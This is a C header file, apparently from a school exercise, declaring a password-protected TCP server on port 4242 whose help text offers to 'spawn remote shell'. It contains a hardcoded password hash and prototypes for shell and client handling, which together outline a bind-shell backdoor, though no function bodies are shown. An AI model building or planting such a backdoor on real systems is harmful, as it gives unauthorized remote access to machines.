#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include "libft.h"
#include <dirent.h>
#include <string.h>

#ifdef DEBUG_MODE
	#define DEBUG(format, ...) printf(format, ##__VA_ARGS__)
#else
	#define DEBUG(format, ...) {}
#endif

#define PUTSTR(fd, s) send(fd, s, ft_strlen(s), MSG_NOSIGNAL)
#define MAX_CLIENTS 3
#define PORT 4242
#define HASHED_PASSWORD 1340397520672655617UL

#define FNV_OFFSET 14695981039346656037UL
#define FNV_PRIME 1099511628211UL

#define HELP							\
"?		show help\n"					\
"shell	spawn remote shell on 4242\n"

typedef enum {
	CLI,
	PASSWORD,
	SHELL
} State;

typedef struct {
	int fd;
	bool logged;
} Client;

void init_clients(Client *clients);
void add_client(Client *clients, int fd);
Client *get_client(Client *clients, int fd);
void disconnect_client(Client *client, int epollfd, struct epoll_event *ev);
void refuse_client(int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev);

int new_connection(
	int sock, int epollfd, struct sockaddr_in *addr, struct epoll_event *ev);
int init_socket(struct sockaddr_in *addr);
char *readline(int fd);

void disconnect_shell(int fd, Client *clients, int epollfd, struct epoll_event *ev);
void sh(Client *client, int pipefd);

void check_password(Client *client, char *line);

char *clean_join(char *s1, char *s2);
